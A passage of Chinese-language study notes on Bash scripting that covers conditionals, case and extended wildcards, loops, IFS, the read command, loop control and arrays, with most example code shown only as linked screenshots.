alt="image-20220316205402209"></p><p>上面的脚本可以根据网页文件是否可以被访问来测试服务器的健康状态。然而，当网页的数据内容被人恶意篡改后，虽然网页依然可以被访问，但服务器的健康状态已经出问题了！此时，可以使用Hash值对数据的完整性进行校验，以防止数据被篡改。数据Hash值的特点就是当数据发生改变时Hash值也会随之改变，如果数据没变化，则Hash值永远不变。在CentOS系统中提供了md5sum、sha1sum、sha256sum、sha384sum、sha512sum等可以计算Hash值的命令。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316205520577.png" alt="image-20220316205520577"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316205630685.png" alt="image-20220316205630685"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316210329807.png" alt="image-20220316210329807"></p><h3 id="2-10实战系列-多分支if语句"><a href="#2-10实战系列-多分支if语句" class="headerlink" title="2.10实战系列:多分支if语句"></a>2.10实战系列:多分支if语句</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316210452813.png" alt="image-20220316210452813"></p><p>多分支if语句工作流程如图2-4所示。如果if判断1成立（结果为真），则执行命令序列1中的命令，否则继续进行elif判断；如果elif判断2成立，则执行命令序列2中的命令，否则继续进行elif判断3，依此类推。如果所有的条件判断都不成立，则执行最后else语句中的命令序列n的命令。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316210532229.png" alt="image-20220316210532229"></p><p>在CentOS7系统中提供了一个可以非交互创建磁盘分区的</p><p>parted命令的语法格式如下，常用磁盘操作指令</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316211405044.png" alt="image-20220316211405044"></p><p>修改分区表类型</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317135145098.png" alt="image-20220317135145098"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317135159832.png" alt="image-20220317135159832"></p><p>除了基本的创建与删除分区，利用parted命令还可以进行分区检查、调整分区大小、恢复误删除分区等操作，关于parted命令的更多使用方法，可以查阅man手册。接下来看如何通过脚本实现分区管理。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317142029791.png" alt="image-20220317142029791"></p><h3 id="2-11实战案例：简单、高效的case语句"><a href="#2-11实战案例：简单、高效的case语句" class="headerlink" title="2.11实战案例：简单、高效的case语句"></a>2.11实战案例：简单、高效的case语句</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317142135107.png" alt="image-20220317142135107"></p><p>case语句还支持多个条件的匹配，语法格式如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317142338299.png" alt="image-20220317142338299"></p><p>上面的语法中，case命令首先会展开word关键字，然后将该关键字与下面的每个模式进行匹配比较。word关键字展开支持使用～（根目录）、变量展开$、算术运算展开$[]、命令展开$（）等。每个模式匹配中也都支持与word关键字一样的展开功能。一旦case命令发现有匹配的模式，则执行对应命令序列中的命令。如果命令序列的最后使用了；;（双分号），则case命令不再对后续的模式进行匹配比较，即匹配停止。如果使用；&amp;替代；；会导致case继续执行下一个模式匹配中附加的命令序列。如果使用；; &amp;替代；；则会导致case继续对下一个模式进行匹配，如果匹配则执行对应命令序列中的命令。下面通过几个简单的实例学习case语句的基本语法格式。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317143005294.png" alt="image-20220317143005294"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317143717614.png" alt="image-20220317143717614"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317143740175.png" alt="image-20220317143740175"></p><p>case命令可以使用管道符号（|）进行多个模式的匹配，编写有些交互脚本时需要使用这个功能。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317150426805.png" alt="image-20220317150426805"></p><p>注意后面有个)</p><p>不然会报错</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317150500237.png" alt="image-20220317150500237"></p><h3 id="2-12-编写nginx启动脚本"><a href="#2-12-编写nginx启动脚本" class="headerlink" title="2.12 编写nginx启动脚本"></a>2.12 编写nginx启动脚本</h3><p>case语句另一个常用的应用案例是编写CentOS6风格的服务启动脚本，在CentOS7系统中虽然使用systemctl替代了旧版本的service，但在实际生产环境中还是有大量案例需要编写旧版本的service启动脚本，而且CentOS7也向下兼容CentOS6的启动脚本。注意：CentOS6风格的service启动脚本文件必须存放在&#x2F;etc&#x2F;init.d&#x2F;目录下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317153647581.png" alt="image-20220317153647581"></p><h3 id="2-13-揭秘模式匹配与通配符、扩展通配符"><a href="#2-13-揭秘模式匹配与通配符、扩展通配符" class="headerlink" title="2.13 揭秘模式匹配与通配符、扩展通配符"></a>2.13 揭秘模式匹配与通配符、扩展通配符</h3><p>使用case进行模式匹配时，除了一些特殊符号，在模式匹配中出现的任何字符都仅代表其自身。在模式匹配中支持具有特殊含义的字符，通常这些符号被称为通配符，</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317172152112.png" alt="image-20220317172152112"></p><p>下面通过案例看看如何使用通配符识别用户输入的内容。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317172412374.png" alt="image-20220317172412374"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317172420188.png" alt="image-20220317172420188"></p><p>从测试脚本的执行效果可以看出，上面这个脚本仅可以识别一个字符，如果输入的内容的字符数超过一个，则全部被识别为其他特殊符号。而且在使用[A-Z]这样的排序集合时，Shell默认会根据系统的locale字符集排序，如果字符集使用不当，会导致匹配不到任何数据的情况发生，这个结果显然是不太合理的。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317172753057.png" alt="image-20220317172753057"></p><p>查看字符集</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317173155836.png" alt="image-20220317173155836"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317173312240.png" alt="image-20220317173312240"></p><p>可以使用shopt命令切换影响Shell行为的控制选项，如果使用shopt命令将Shell的extglob控制选项开启，则在Shell中可以支持如表2-8所示的扩展通配符。shopt命令用于显示和设置Shell的各种属性，shopt命令不设置任何参数时，可以显示所有Shell属性及属性值。使用shopt命令的-s选项可以激活某个特定的Shell属性功能，而-u选项则可以禁用某个特定的属性功能。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317190935035.png" alt="image-20220317190935035"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317195632278.png" alt="image-20220317195632278"></p><p>shopt #查看所有变量</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317195734820.png" alt="image-20220317195734820"></p><p>通过一个示例演示扩展通配符的作用。脚本需要结合实际执行效果反复验证并思考匹配的流程与原理。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317201053646.png" alt="image-20220317201053646"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317201320331.png" alt="image-20220317201320331"></p><p>从执行结果中可以看出，+这个通配符的作用就是对模式至少进行1次匹配，所以不管输入多少个Y都会匹配成功。Y不区分大小写，因为模式中使用的[Yy]代表集合中的任意单个字符</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317201742796.png" alt="image-20220317201742796"></p><p>使用？通配符仅对模式进行0次或1次匹配（最多1次）。本示例中使用？对大小写的字母N进行匹配，表示N可以出现1次，也可以不出现，但最多出现1次。而后面的字母o是必须有的，没有特殊转义，也没有特殊匹配。所以执行脚本后，输入No、no或o都可以匹配成功，但是输入多于1个n则匹配失败。最终与！（[[:punct:]]）匹配成功，屏幕回显：”输入的不是标点符号”。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317201831608.png" alt="image-20220317201831608"></p><p>使用扩展通配符@可以指定仅对模式进行1次匹配，示例中使用@对数字进行匹配，所以当输入8或其他任意单个数字时都会匹配成功，但是输入任意多个数字则无法匹配成功。</p><p>一定要使用shopt命令先将控制变量extglob开启，否则执行脚本时会报错。</p><h2 id="3根本停不下来的循环和中断控制"><a href="#3根本停不下来的循环和中断控制" class="headerlink" title="3根本停不下来的循环和中断控制"></a>3根本停不下来的循环和中断控制</h2><h3 id="3-1for循环"><a href="#3-1for循环" class="headerlink" title="3.1for循环"></a>3.1for循环</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317202456542.png" alt="image-20220317202456542"></p><p>在该基本语法格式中，name是可以任意定义的变量名称，word是支持扩展的项目列表，扩展后生成一份完整的项目列表（或值列表）。name会逐一提取项目列表中的每一个值，每提取一个值就会执行一次do和done中间的命令序列。下面通过几个简单的例子演示for循环语句的基本语法。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220317202635221.png" alt="image-20220317202635221"></p><p>变量name没有定义取值的范围，这个循环语句到底会循环多少次呢？如果变量name没有定义取值范围，则默认取值为$@，也就是所有位置变量的值。这样有几个位置变量，该for循环语句就循环几次。下面通过一个示例演示效果</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317202756847.png" alt="image-20220317202756847"></p><p>执行for-domo3.sh脚本，因为提供了3个参数，分别是hello、798和beijing，所以当第一次循环时i取值为hello，执行命令echo $i，屏幕回显hello。当第二次循环时i取值为798，执行命令echo $i，屏幕回显798。当第三次循环时i取值为beijing，执行命令echo $i，屏幕回显beijing。</p><p>有时候脚本的循环语句需要执行成百上千次，如果每一个值都手动输入，谁也无法接受。Shell支持使用seq或{}自动生成数字序列，并且使用{}还可以自动生成字母序列。for循环语句可以对{}或seq扩展后的数据列表进行循环。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220317203157172.png" alt="image-20220317203157172"></p><p>上面这条命令从1开始，最大到10，中间的步长是2。1+2&#x3D;3,3+2&#x3D;5,5+2&#x3D;7,7+2&#x3D;9, 9+2&#x3D;11，因为11超出了1～10的范围，所以命令的实际最大输出结果为9。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203234644.png" alt="image-20220317203234644"></p><p>但是，当在{}中调用其他变量时一定要注意，并不会得到我们想要的数字序列。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203250141.png" alt="image-20220317203250141"></p><p>另外，还可以使用seq命令生成数字序列，并且可以调用其他变量，但该命令不支持生成字母序列。默认输出序列的分隔符是\n换行符，也可以使用-s选项自定义分隔符。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203310893.png" alt="image-20220317203310893"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203319629.png" alt="image-20220317203319629"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203340520.png" alt="image-20220317203340520"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203356667.png" alt="image-20220317203356667"></p><p>对有序的数字（年份）进行循环并判断其是否为闰年，就是一个不错的练习案例。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317205034939.png" alt="image-20220317205034939"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317210515728.png" alt="image-20220317210515728"></p><p>下面的脚本通过快速生成数字序列，测试某个网段内所有主机的连通性。虽然在Linux系统中可以通过安装Nmap快速测试主机的连通性，但是这些示例却可以帮助我们更好地理解for循环语句。通过大量类似案例的训练，可以为后续其他应用案例打下坚实的基础。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317211709381.png" alt="image-20220317211709381"></p><p>或者使用seq快速生成数字序列。因为seq是一个命令，而此时需要的是命令的执行结果，所以这里需要使用$（）或&#96;&#96;对命令进行扩展，获取命令的执行结果。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317212334289.png" alt="image-20220317212334289"></p><p>Bash Shell除了支持前面的语法格式，还支持C语言风格的for循环语法格式。熟悉C语言的开发者对for（i&#x3D;1; i＜&#x3D;6; i++）这种语法格式肯定非常熟悉，但在Shell中需要额外添加一对括号。其基本语法格式如下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317212558909.png" alt="image-20220317212558909"></p><h3 id="3-2实战-猴子香蕉"><a href="#3-2实战-猴子香蕉" class="headerlink" title="3.2实战:猴子香蕉"></a>3.2实战:猴子香蕉</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317213556013.png" alt="image-20220317213556013"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317213638413.png" alt="image-20220317213638413"></p><h3 id="3-3-实战案例：进化版HTTP状态监控脚本"><a href="#3-3-实战案例：进化版HTTP状态监控脚本" class="headerlink" title="3.3 实战案例：进化版HTTP状态监控脚本"></a>3.3 实战案例：进化版HTTP状态监控脚本</h3><p>2.9节介绍了很多监控HTTP服务的脚本。但是，因为没有使用循环语句，所以检测结果都是以一次判断为依据的。而在实际生产环境中业务可能会发生短暂的健康抖动，从而造成服务处于不可用状态，但实际上服务是没有问题的。抖动的原因很多，如网络的问题、访问量的问题、计算机硬件的问题等。因此可以对服务做多次检测，比如3次检测都不正常，则认定为服务器故障。可以通过循环语句对特定的服务器页面进行多次检测，并设置一个失败次数的计数器，当失败次数等于3时则脚本报警，否则仅通过记录日志的形式记录状态。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317214714288.png" alt="image-20220317214714288"></p><h3 id="3-4-神奇的循环嵌套"><a href="#3-4-神奇的循环嵌套" class="headerlink" title="3.4 神奇的循环嵌套"></a>3.4 神奇的循环嵌套</h3><p>画出国际象棋棋盘</p><p>根据白色</p><p>行和列的求和为偶数</p><p>行和列的求和为奇数</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317222848117.png" alt="image-20220317222848117"></p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220317223325475.png" alt="image-20220317223325475"></p><h3 id="3-5-非常重要的IFS"><a href="#3-5-非常重要的IFS" class="headerlink" title="3.5 非常重要的IFS"></a>3.5 非常重要的IFS</h3><p>在Shell中使用内部变量IFS（Internal Field Seprator）来决定项目列表或值列表的分隔符，IFS的默认值为空格、Tab制表符或换行符。使用for循环读取项目列表或值列表时，就会根据IFS的值判断列表中值的个数，最终决定循环的次数。例如，A&#x3D;”hello theworld”，当使用空格作分隔符时，变量A的值有三列。但是，当使用字母t作为分隔符时，变量A的值就有两列。所以当使用不同的分隔符时读取数据的结果也会有很大差别，这点在编写脚本时一定要注意！IFS的多个值之间是“或”关系，所以for循环在读取列表时，数据可以使用空格分隔，或使用Tab制表符分隔，或使用换行符对数据进行分隔。因为空格、Tab制表符和换行符都属于ASCII码表中的控制字符，是不可显示的内容，所以正常使用echo命令显示该变量的值时，是看不到内容的，但是可以通过od命令将数据转换为八进制数据后再查看。ASCII码表的全部内容较多</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317224154992.png" alt="image-20220317224154992"></p><p>注意，当使用echo命令输出IFS的值时，因为IFS的值是空格或Tab制表符，所以无法显示具体内容。另外，因为IFS的值还可以是一个换行符，所以输出结果可以是一个独立的空白行，而echo命令在输出数据内容后又会自动进行一次换行，所以最后输出两个空白行！如果使用printf命令输出IFS值，就不会有两个空白行的情况发生，因为printf打印完内容后默认不换行。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317224256656.png" alt="image-20220317224256656"></p><p>不管是使用echo还是printf命令，在输出的结果中都无法显式地查看到具体的内容。但是，可以使用od命令将数据转换为八进制后再查看。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317224434862.png" alt="image-20220317224434862"></p><p>输出结果中的040是空格键、011是Tab制表符、012是换行符。因为IFS的原始值不容易设置，所以当需要修改IFS值时，最好提前备份其原始值</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317225728290.png" alt="image-20220317225728290"></p><p>观察并分析上面这一组命令的结果可知，因为已经将IFS的值修改为冒号（:），而当通过read命令读取三个变量的值时，如果输入的3个字符是以空格为分隔符的，则系统会认为”a b c”是一个完整的数据，并将其赋值给变量x，这样就导致没有定义变量y和z的值，输出的变量y和z的值就为空。如果希望给x、y、z三个变量都赋值，就需要输入数据时使用冒号分隔数据。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317225803505.png" alt="image-20220317225803505"></p><p>下面通过一系列的案例，再看看Shell脚本中使用for循环语句读取数据列表时，IFS对脚本又有哪些影响？</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/image-20220317233530136.png"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317233639210.png" alt="image-20220317233639210"></p><p>就是说只要是；.：中的任何一个都能成为分隔符</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317235746182.png" alt="image-20220317235746182"></p><p>同样通过read命令读取3个变量的值，如果输入的数字字符之间使用t分隔，则系统会认为1、2和3是三个独立的值，并将这三个值分别赋值给变量x、y和z。最终使用echo命令回显变量值时，x、y和z变量都有正确的值</p><p>这也证明了，使用IFS&#x3D;”\t”并不能将特殊的控制字符设置为分隔符。那么，该如何正确地将特殊的控制字符设置为系统默认的分隔符呢？当需要使用表3-2中特殊的控制字符作为分隔符时，必须使用$’string’方式进行设置，否则系统无法正确理解控制字符的含义。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318000145605.png" alt="image-20220318000145605"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318000152879.png" alt="image-20220318000152879"></p><p>注意了 必须是‘ 而不是“</p><h3 id="3-6-实战案例：while循环"><a href="#3-6-实战案例：while循环" class="headerlink" title="3.6 实战案例：while循环"></a>3.6 实战案例：while循环</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318175017534.png" alt="image-20220318175017534"></p><p>while命令后面的条件判断只要语句命令返回码为0就代表真，否则代表假。并非仅仅可以写[]或[[]]判断，while的判断可以是任何可以执行的命令。比如编写一个实时检测服务进程状态的脚本，当Httpd服务进程启动时脚本进行持续的跟踪检测，而当Httpd服务进程关闭时则循环结束，脚本提示警告信息后退出。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318175453222.png" alt="image-20220318175453222"></p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318175522146.png" alt="image-20220318175522146"></p><h3 id="3-7死循环"><a href="#3-7死循环" class="headerlink" title="3.7死循环"></a>3.7死循环</h3><p>前面的案例多数都是有限次数的循环脚本，但有些脚本则需要死循环执行，通常这种情况都会使用while true或while ：来实现功能。在Shell中，true和：都是固定返回退出码0的空命令，这两个命令都不会进行任何实际的操作。与true相反的另一个命令为false, false命令是一个退出码为非0的空命令。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318184344986.png" alt="image-20220318184344986"></p><h3 id="3-8-实战案例：如何通过read命令读取文件中的数据"><a href="#3-8-实战案例：如何通过read命令读取文件中的数据" class="headerlink" title="3.8 实战案例：如何通过read命令读取文件中的数据"></a>3.8 实战案例：如何通过read命令读取文件中的数据</h3><p>首先，回顾并了解read命令的几个特性。</p><p>当定义了三个变量，但输入时仅输入一个值时，则后两个变量的值为空。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318184723874.png" alt="image-20220318184723874"></p><p>当定义两个变量但输入三个或多个值时，则从第二个值开始及后面的所有值都会被赋值给第二个变量。如果只定义一个变量，那么不管通过键盘输入多少值都会被赋值给变量。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318184857336.png" alt="image-20220318184857336"></p><p>然后看如何结合while循环批量读取数据并通过read命令给变量赋值，基本格式如下。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318185319085.png" alt="image-20220318185319085"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318185327716.png" alt="image-20220318185327716"></p><p>开始执行while循环后，read命令会从标准输入或管道中读取数据，如果能读取到数据则执行do和done之间的所有命令，与标准while语句一样，命令执行完后会返回到while语句，继续下一次循环，直到read命令读取文件内容失败，则整个循环结束。下面通过几个简单的案例，学习基本语法格式。为此，需要先创建一个测试性的文本文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318185914419.png" alt="image-20220318185914419"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318190311481.png" alt="image-20220318190311481"></p><p>类似的方式，当使用read命令从文件中读取数据并赋值给两个变量时，每一行第一个空格前的内容会赋值给第一个变量，后面的所有内容会赋值给第二个变量。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318190556968.png" alt="image-20220318190556968"></p><p>但是，如果数据文件的分隔符不是空格怎么办呢？通过read命令如何更好地处理这样的数据呢？可以通过修改IFS变量，实现自定义数据分隔符。下面看一个读取passwd文件的示例。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318191558637.png" alt="image-20220318191558637"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318191122960.png" alt="image-20220318191122960"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318191203172.png" alt="image-20220318191203172"></p><p>通过上面的示例，可以顺利地读取&#x2F;etc&#x2F;passwd文件中的每行数据。但直接在脚本开始时修改IFS变量的值，会对整个脚本都有影响，如果仅仅希望read命令在读取数据时以冒号为分隔符，同时又不影响其他程序，则可以使用如下的方式完成相同的工作。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318191351966.png" alt="image-20220318191351966"></p><p>另一种语法格式是使用管道将数据传递给while循环，批量读取数据文件，下面通过一个命令行的案例，学习该语法格式。但需要注意，通常情况下使用重定向导入的方式往往比管道的效率高。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318192257901.png" alt="image-20220318192257901"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318192022652.png" alt="image-20220318192022652"></p><p>df是用来计算磁盘空间占用情况</p><p>-h是令1k计算为1000b</p><p>上面的命令首先过滤所有以&#x2F;开始的分区挂载信息，然后将数据通过管道的方式传递给while循环，read命令定义了三个变量，name对应的是磁盘名称，size对应的是磁盘总容量，other对应的是其他所有信息。在while循环体内，通过echo命令输出磁盘设备名称和总容量。</p><h3 id="3-9-until和select循环"><a href="#3-9-until和select循环" class="headerlink" title="3.9 until和select循环"></a>3.9 until和select循环</h3><p>在Shell脚本环境中还有另外两个循环语句，分别是until和select。until实现与while一样的功能，select循环主要用于创建菜单选项。</p><p>until语句的语法格式如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318192448671.png" alt="image-20220318192448671"></p><p>与while语句相反，until循环语句只有当条件判断结果为真时才退出循环，而当条件判断结果为假时则执行循环体中的命令。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318192758153.png" alt="image-20220318192758153"></p><p>由于until语句与while语句可以实现相同的功能，在生产环境中更多地会使用while语句编写循环脚本，所以这里也仅通过一个简单的示例学习until语句的语法格式即可。</p><p>使用select循环的主要目的是方便地创建菜单，其基本语法格式如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318192921185.png" alt="image-20220318192921185"></p><p>下面通过一个查看系统信息的脚本来看select语句的应用示例。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318194127585.png" alt="image-20220318194127585"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318194216988.png" alt="image-20220318194216988"></p><h3 id="3-10-中断与退出控制"><a href="#3-10-中断与退出控制" class="headerlink" title="3.10 中断与退出控制"></a>3.10 中断与退出控制</h3><p>在执行循环的过程中，有时候并不希望执行完所有的循环命令！比如，如果编写了一个循环脚本，脚本会通过循环逐一访问远程某个网段（如192.168.4.0&#x2F;24）内的所有主机，并试图将所有主机重启或关机。但是如果执行脚本的这台主机的IP地址也在这个网段内呢？所以，在有些特殊的情况下并不希望完整地执行完所有循环命令。Shell针对循环专门设计了中断与退出语句：continue、break和exit。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318200510297.png" alt="image-20220318200510297"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318200541570.png" alt="image-20220318200541570"></p><p>下面再学习另外一个中断命令break，该命令可以结束整个循环体，break后面的所有语句不再执行，并且整个循环提前结束。如果脚本使用了循环的嵌套功能，则break命令后面可以跟数字参数（数字要求大于或等于1），表示对第几层循环执行中断。下面通过简单示例演示它的功能。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318203304022.png" alt="image-20220318203304022"></p><p>最后看一个中断级别最高的命令exit，该命令会直接结束整个脚本，exit后面也可以跟数字参数，表示脚本的退出状态，如果没有指定数字参数，则脚本的退出状态就是上一个命令的退出状态。下面通过几个简单示例演示它的功能。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318203739911.png" alt="image-20220318203739911"></p><p>分析脚本执行结果，与break示例一样，前面两次循环正常输出数字1和2，当循环至第三次i取值为3时，exit命令被触发导致整个脚本结束，虽然循环体中后面还有echo命令，但是后面有再多命令也不会被执行。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318203908633.png" alt="image-20220318203908633"></p><h3 id="3-11-Shell小游戏之机选双色球"><a href="#3-11-Shell小游戏之机选双色球" class="headerlink" title="3.11 Shell小游戏之机选双色球"></a>3.11 Shell小游戏之机选双色球</h3><p>双色球彩票投注分为红色球和蓝色球，每注投注号码由6个红色球号码和1个蓝色球号码组成，红色球号码从1～33中选择，蓝色球号码从1～16中选择，投注时不管是红色球还是蓝色球都不允许出现重复的号码。</p><p>为了编写这样一个机选双色球的脚本，需要先了解几个技巧。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318204649595.png" alt="image-20220318204649595"></p><p>通过+&#x3D;的方式，可以将任意个数的字符追加保存到一个变量中，而机选双色球中的红色球就需要这样的一个变量，在这个变量中保存所有随机的6组红色球号码。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318204948920.png" alt="image-20220318204948920"></p><p>使用wc命令可以对数据进行统计操作，不同的选项输出的结果不同</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318205253792.png" alt="image-20220318205253792"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318210215531.png" alt="image-20220318210215531"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318210242620.png" alt="image-20220318210242620"></p><h2 id="4请开始你的表演，数组、Subshell与函数"><a href="#4请开始你的表演，数组、Subshell与函数" class="headerlink" title="4请开始你的表演，数组、Subshell与函数"></a>4请开始你的表演，数组、Subshell与函数</h2><h3 id="4-1数组"><a href="#4-1数组" class="headerlink" title="4.1数组"></a>4.1数组</h3><p>shell支持一种特殊的变量——数组。数组是一组数据的集合，数组中的每个数据被称为一个数组元素。目前Bash仅支持一维索引数组和关联数组，Bash对数组大小没有限制。</p><p>定义和调用索引数组的基本语法格式如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318231948731.png" alt="image-20220318231948731"></p><p>这里定义了一个变量名称为name的数组，该数组中存储了5组数据，索引（也称为下标）分别为0、1、2、3、8，索引可以是算术表达式，但要求运算的结果是整数。可以通过索引定义数组，同样也可以使用索引获取数组中某个元素的值。注意，数字索引可以是一个变量，索引可以不连续。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318232524141.png" alt="image-20220318232524141"></p><p><img 